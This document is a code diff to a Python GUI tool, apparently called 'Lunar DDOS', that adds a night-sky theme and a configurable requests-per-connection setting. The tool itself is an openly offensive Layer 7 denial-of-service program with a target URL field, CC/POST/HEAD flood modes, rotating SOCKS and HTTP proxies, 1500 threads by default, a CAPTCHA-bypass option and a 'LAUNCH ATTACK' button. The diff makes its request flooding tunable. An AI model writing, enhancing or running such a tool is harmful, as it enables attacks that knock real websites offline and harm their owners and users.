@@ -55,6 +55,7 @@ proxy_ver = "5"
 brute = False
 out_file = "proxy.txt"
 thread_num = 1500
+requests_per_conn = 100  # New variable for requests per connection
 data = ""
 cookies = ""
 target = ""
@@ -182,80 +183,130 @@ class CaptchaSolver:
 
 captcha_solver = CaptchaSolver()
 
+class NightSkyCanvas(Canvas):
+    def __init__(self, parent, width, height, *args, **kwargs):
+        Canvas.__init__(self, parent, width=width, height=height, *args, **kwargs)
+        self.width = width
+        self.height = height
+        self.configure(bg='#0a0a1a', highlightthickness=0)
+        self.create_moon()
+        self.create_stars()
+        
+    def create_moon(self):
+        # Create a moon in the top right corner
+        self.create_oval(self.width - 80, 20, self.width - 20, 80, 
+                         fill="#f0f0a0", outline="#c0c080", width=2)
+        # Moon craters
+        self.create_oval(self.width - 60, 40, self.width - 50, 50, 
+                         fill="#d0d090", outline="")
+        self.create_oval(self.width - 70, 60, self.width - 65, 65, 
+                         fill="#d0d090", outline="")
+        self.create_oval(self.width - 40, 30, self.width - 35, 35, 
+                         fill="#d0d090", outline="")
+    
+    def create_stars(self):
+        # Create random stars
+        for _ in range(100):
+            x = random.randint(0, self.width)
+            y = random.randint(0, 150)  # Only in top part
+            size = random.choice([1, 1, 1, 2])
+            self.create_oval(x, y, x+size, y+size, fill="white", outline="")
+
 class DDoSApp:
     def __init__(self, root):
         self.root = root
-        self.root.title("Advanced DDoS Tool v2.0")
-        self.root.geometry("900x700")
+        self.root.title("Lunar DDOS GUI")
+        self.root.geometry("950x750")
         self.root.resizable(False, False)
-        self.root.configure(bg="#1a1a1a")
+        self.root.configure(bg='#0a0a1a')
+        
+        # Create night sky background
+        self.night_sky = NightSkyCanvas(root, width=950, height=150)
+        self.night_sky.pack(fill=X)
+        
+        # Main container frame
+        self.main_container = Frame(root, bg='#0a0a1a')
+        self.main_container.pack(fill=BOTH, expand=True)
         
         self.style = ttk.Style()
         self.style.theme_use('clam')
-        self.style.configure('TFrame', background='#1a1a1a')
-        self.style.configure('TLabel', background='#1a1a1a', foreground='white', font=('Helvetica', 10))
-        self.style.configure('TButton', background='#333333', foreground='white', font=('Helvetica', 10))
-        self.style.configure('TEntry', fieldbackground='#333333', foreground='white')
-        self.style.configure('TCombobox', fieldbackground='#333333', foreground='white')
-        self.style.configure('TCheckbutton', background='#1a1a1a', foreground='white')
-        self.style.map('TButton', background=[('active', '#444444')])
+        self.style.configure('TFrame', background='#0a0a1a')
+        self.style.configure('TLabel', background='#0a0a1a', foreground='#e0e0e0', font=('Helvetica', 10))
+        self.style.configure('TButton', background='#1a1a3a', foreground='white', font=('Helvetica', 10))
+        self.style.map('TButton', background=[('active', '#2a2a4a')])
+        self.style.configure('TEntry', fieldbackground='#1a1a3a', foreground='white', insertcolor='white')
+        self.style.configure('TCombobox', fieldbackground='#1a1a3a', foreground='white')
+        self.style.configure('TCheckbutton', background='#0a0a1a', foreground='#e0e0e0')
+        self.style.configure('TLabelframe', background='#0a0a1a', foreground='#e0e0e0')
+        self.style.configure('TLabelframe.Label', background='#0a0a1a', foreground='#e0e0e0')
         
-        self.main_frame = ttk.Frame(root)
-        self.main_frame.pack(fill=BOTH, expand=True, padx=10, pady=10)
+        # Header frame
+        self.header_frame = ttk.Frame(self.main_container)
+        self.header_frame.pack(fill=X, pady=(0, 10))
         
-        self.header_frame = ttk.Frame(self.main_frame)
-        self.header_frame.pack(fill=X, pady=(0, 20))
-        
-        self.title_label = Label(self.header_frame, text="ADVANCED DDoS TOOL", 
-                               font=("Helvetica", 18, "bold"), fg="#ff3333", bg="#1a1a1a")
+        self.title_label = Label(self.header_frame, text="Lunar DDOS V.1.0", 
+                               font=("Helvetica", 20, "bold"), fg="#6080ff", bg='#0a0a1a')
         self.title_label.pack()
         
         self.subtitle_label = Label(self.header_frame, text="Powerful Layer 7 Attack Tool with CAPTCHA Bypass", 
-                                   font=("Helvetica", 10), fg="white", bg="#1a1a1a")
+                                   font=("Helvetica", 10), fg="#a0a0ff", bg='#0a0a1a')
         self.subtitle_label.pack()
         
-        self.input_frame = ttk.Frame(self.main_frame)
-        self.input_frame.pack(fill=X, pady=(0, 20))
+        # Input frame
+        self.input_frame = ttk.LabelFrame(self.main_container, text="Attack Configuration")
+        self.input_frame.pack(fill=X, padx=10, pady=5)
         
+        # Row 0
         self.url_label = ttk.Label(self.input_frame, text="Target URL:")
         self.url_label.grid(row=0, column=0, sticky=W, padx=5, pady=5)
         self.url_entry = ttk.Entry(self.input_frame, width=50)
-        self.url_entry.grid(row=0, column=1, padx=5, pady=5)
+        self.url_entry.grid(row=0, column=1, padx=5, pady=5, columnspan=2)
         
+        # Row 1
         self.mode_label = ttk.Label(self.input_frame, text="Attack Mode:")
         self.mode_label.grid(row=1, column=0, sticky=W, padx=5, pady=5)
         self.mode_combo = ttk.Combobox(self.input_frame, values=["CC", "POST", "HEAD"], state="readonly")
-        self.mode_combo.grid(row=1, column=1, padx=5, pady=5)
+        self.mode_combo.grid(row=1, column=1, padx=5, pady=5, sticky=W)
         self.mode_combo.current(0)
         
+        self.req_label = ttk.Label(self.input_frame, text="Requests/Conn:")
+        self.req_label.grid(row=1, column=2, sticky=W, padx=5, pady=5)
+        self.req_entry = ttk.Entry(self.input_frame, width=10)
+        self.req_entry.insert(0, "100")
+        self.req_entry.grid(row=1, column=3, padx=5, pady=5, sticky=W)
+        
+        # Row 2
         self.proxy_label = ttk.Label(self.input_frame, text="Proxy Type:")
         self.proxy_label.grid(row=2, column=0, sticky=W, padx=5, pady=5)
         self.proxy_combo = ttk.Combobox(self.input_frame, values=["SOCKS4", "SOCKS5", "HTTP"], state="readonly")
-        self.proxy_combo.grid(row=2, column=1, padx=5, pady=5)
+        self.proxy_combo.grid(row=2, column=1, padx=5, pady=5, sticky=W)
         self.proxy_combo.current(1)
         
         self.threads_label = ttk.Label(self.input_frame, text="Threads:")
-        self.threads_label.grid(row=3, column=0, sticky=W, padx=5, pady=5)
-        self.threads_entry = ttk.Entry(self.input_frame)
+        self.threads_label.grid(row=2, column=2, sticky=W, padx=5, pady=5)
+        self.threads_entry = ttk.Entry(self.input_frame, width=10)
         self.threads_entry.insert(0, "1500")
-        self.threads_entry.grid(row=3, column=1, padx=5, pady=5)
+        self.threads_entry.grid(row=2, column=3, padx=5, pady=5, sticky=W)
         
+        # Row 3
         self.duration_label = ttk.Label(self.input_frame, text="Duration (seconds):")
-        self.duration_label.grid(row=4, column=0, sticky=W, padx=5, pady=5)
-        self.duration_entry = ttk.Entry(self.input_frame)
+        self.duration_label.grid(row=3, column=0, sticky=W, padx=5, pady=5)
+        self.duration_entry = ttk.Entry(self.input_frame, width=10)
         self.duration_entry.insert(0, "120")
-        self.duration_entry.grid(row=4, column=1, padx=5, pady=5)
+        self.duration_entry.grid(row=3, column=1, padx=5, pady=5, sticky=W)
         
+        # Options row
         self.brute_var = IntVar()
         self.brute_check = ttk.Checkbutton(self.input_frame, text="Brute Mode", variable=self.brute_var)
-        self.brute_check.grid(row=5, column=1, sticky=W, padx=5, pady=5)
+        self.brute_check.grid(row=4, column=0, sticky=W, padx=5, pady=5)
         
         self.captcha_var = IntVar(value=1)
         self.captcha_check = ttk.Checkbutton(self.input_frame, text="Enable CAPTCHA Bypass", variable=self.captcha_var)
-        self.captcha_check.grid(row=6, column=1, sticky=W, padx=5, pady=5)
+        self.captcha_check.grid(row=4, column=1, sticky=W, padx=5, pady=5)
         
-        self.proxy_options_frame = ttk.LabelFrame(self.main_frame, text="Proxy Options")
-        self.proxy_options_frame.pack(fill=X, pady=(0, 20))
+        # Proxy options frame
+        self.proxy_options_frame = ttk.LabelFrame(self.main_container, text="Proxy Management")
+        self.proxy_options_frame.pack(fill=X, padx=10, pady=5)
         
         self.proxy_file_label = ttk.Label(self.proxy_options_frame, text="Proxy File:")
         self.proxy_file_label.grid(row=0, column=0, sticky=W, padx=5, pady=5)
@@ -269,16 +320,19 @@ class DDoSApp:
         
         self.check_proxies_btn = ttk.Button(self.proxy_options_frame, text="Check Proxies", 
                                            command=self.check_proxies)
-        self.check_proxies_btn.grid(row=1, column=2, padx=5, pady=5)
+        self.check_proxies_btn.grid(row=0, column=3, padx=5, pady=5)
         
-        self.attack_btn = ttk.Button(self.main_frame, text="START ATTACK", style='TButton', 
-                                    command=self.start_attack)
-        self.attack_btn.pack(pady=20)
+        # Attack button
+        self.attack_btn = ttk.Button(self.main_container, text="LAUNCH ATTACK", 
+                                    command=self.start_attack, style='TButton')
+        self.attack_btn.pack(pady=10)
         
-        self.log_frame = ttk.LabelFrame(self.main_frame, text="Attack Log")
-        self.log_frame.pack(fill=BOTH, expand=True)
+        # Log frame
+        self.log_frame = ttk.LabelFrame(self.main_container, text="Attack Log")
+        self.log_frame.pack(fill=BOTH, expand=True, padx=10, pady=5)
         
-        self.log_text = Text(self.log_frame, bg="#333333", fg="white", font=("Consolas", 10))
+        self.log_text = Text(self.log_frame, bg="#1a1a3a", fg="#e0e0e0", font=("Consolas", 9), 
+                            insertbackground='white', highlightthickness=0)
         self.log_text.pack(fill=BOTH, expand=True, padx=5, pady=5)
         
         self.scrollbar = ttk.Scrollbar(self.log_text)
@@ -286,18 +340,21 @@ class DDoSApp:
         self.log_text.config(yscrollcommand=self.scrollbar.set)
         self.scrollbar.config(command=self.log_text.yview)
         
+        # Status bar
         self.status_var = StringVar()
         self.status_var.set("Ready")
-        self.status_bar = ttk.Label(self.main_frame, textvariable=self.status_var, relief=SUNKEN)
-        self.status_bar.pack(fill=X, pady=(5, 0))
+        self.status_bar = ttk.Label(self.main_container, textvariable=self.status_var, relief=SUNKEN)
+        self.status_bar.pack(fill=X, padx=10, pady=(0, 5))
         
-        self.log_text.tag_config("error", foreground="red")
-        self.log_text.tag_config("success", foreground="green")
-        self.log_text.tag_config("warning", foreground="yellow")
-        self.log_text.tag_config("info", foreground="cyan")
+        # Configure text tags
+        self.log_text.tag_config("error", foreground="#ff6060")
+        self.log_text.tag_config("success", foreground="#60ff60")
+        self.log_text.tag_config("warning", foreground="#ffff60")
+        self.log_text.tag_config("info", foreground="#60a0ff")
         
     def log(self, message, level="info"):
-        self.log_text.insert(END, message + "\n", level)
+        timestamp = datetime.datetime.now().strftime("[%H:%M:%S] ")
+        self.log_text.insert(END, timestamp + message + "\n", level)
         self.log_text.see(END)
         self.root.update()
     
@@ -337,13 +394,14 @@ class DDoSApp:
         self.status_var.set("Ready")
     
     def start_attack(self):
-        global mode, url, proxy_ver, brute, thread_num, out_file, period, captcha_solver_active
+        global mode, url, proxy_ver, brute, thread_num, requests_per_conn, out_file, period, captcha_solver_active
         
         url = self.url_entry.get()
         mode = self.mode_combo.get().lower()
         proxy_ver = self.proxy_combo.get().lower()
         brute = bool(self.brute_var.get())
         thread_num = int(self.threads_entry.get())
+        requests_per_conn = int(self.req_entry.get())  # Get requests per connection value
         period = int(self.duration_entry.get())
         out_file = self.proxy_file_entry.get()
         captcha_solver_active = bool(self.captcha_var.get())
@@ -353,6 +411,7 @@ class DDoSApp:
             return
         
         self.log(f"Starting attack on {url} with {thread_num} threads", "info")
+        self.log(f"Requests per connection: {requests_per_conn}", "info")
         self.status_var.set("Attack in progress...")
         
         stop_event.clear()
@@ -410,24 +469,17 @@ class DDoSApp:
             stop_event.set()
 
 def bannerm():
-    print(Colorate.Horizontal(Colors.red_to_white, ("""
- ██▓     █    ██  ███▄    █  ▄▄▄       ██▀███     ▓█████▄ ▓█████▄  ▒█████    ██████ 
-▓██▒     ██  ▓██▒ ██ ▀█   █ ▒████▄    ▓██ ▒ ██▒   ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
-▒██░    ▓██  ▒██░▓██  ▀█ ██▒▒██  ▀█▄  ▓██ ░▄█ ▒   ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
-▒██░    ▓▓█  ░██░▓██▒  ▐▌██▒░██▄▄▄▄██ ▒██▀▀█▄     ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
-░██████▒▒▒█████▓ ▒██░   ▓██░ ▓█   ▓██▒░██▓ ▒██▒   ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
-░ ▒░▓  ░░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░    ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
-░ ░ ▒  ░░░▒░ ░ ░ ░ ░░   ░ ▒░  ▒   ▒▒ ░  ░▒ ░ ▒░    ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
-  ░ ░    ░░░ ░ ░    ░   ░ ░   ░   ▒     ░░   ░     ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
-    ░  ░   ░              ░       ░  ░   ░           ░       ░        ░ ░        ░  
-                                                   ░       ░                      
---------------------------------------------------------------------------------
-                        Screenlogged successfully!!!                                                                             
---------------------------------------------------------------------------------
-                        Github: github.com/Sakuzuna/
-                                                                                
+    print(Colorate.Horizontal(Colors.blue_to_purple, ("""
+ ██▓     █    ██  ███▄    █  ▄▄▄       ██▀███  
+▓██▒     ██  ▓██▒ ██ ▀█   █ ▒████▄    ▓██ ▒ ██▒
+▒██░    ▓██  ▒██░▓██  ▀█ ██▒▒██  ▀█▄  ▓██ ░▄█ ▒
+▒██░    ▓▓█  ░██░▓██▒  ▐▌██▒░██▄▄▄▄██ ▒██▀▀█▄ 
+░██████▒▒▒█████▓ ▒██░   ▓██░ ▓█   ▓██▒░██▓ ▒██▒
+░ ▒░▓  ░░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░
+░ ░ ▒  ░░░▒░ ░ ░ ░ ░░   ░ ▒░  ▒   ▒▒ ░  ░▒ ░ ▒░
+  ░ ░    ░░░ ░ ░    ░   ░ ░   ░   ▒     ░░   ░ 
+    ░  ░   ░              ░       ░  ░   ░                                                                   
 """)))
-    print(Colorate.Horizontal(Colors.red_to_white, "Advanced DDoS Tool with CAPTCHA Bypass | v2.0 | 2025"))
     print("\n")
 
 def clearcs():
@@ -632,7 +684,7 @@ def cc(event, proxy_type):
                 ctx.verify_mode = ssl.CERT_NONE
                 s = ctx.wrap_socket(s, server_hostname=target)
             
-            for _ in range(1000):  
+            for _ in range(requests_per_conn):  # Use the global requests_per_conn variable
                 if stop_event.is_set():
                     break
                     
@@ -687,7 +739,7 @@ def head(event, proxy_type):
                 ctx = ssl.SSLContext()
                 s = ctx.wrap_socket(s, server_hostname=target)
             
-            for _ in range(1000):  
+            for _ in range(requests_per_conn):  # Use the global requests_per_conn variable
                 if stop_event.is_set():
                     break
                     
@@ -739,7 +791,7 @@ def post(event, proxy_type):
                 ctx = ssl.SSLContext()
                 s = ctx.wrap_socket(s, server_hostname=target)
             
-            for _ in range(1000):  
+            for _ in range(requests_per_conn):  # Use the global requests_per_conn variable
                 if stop_event.is_set():
                     break
                     
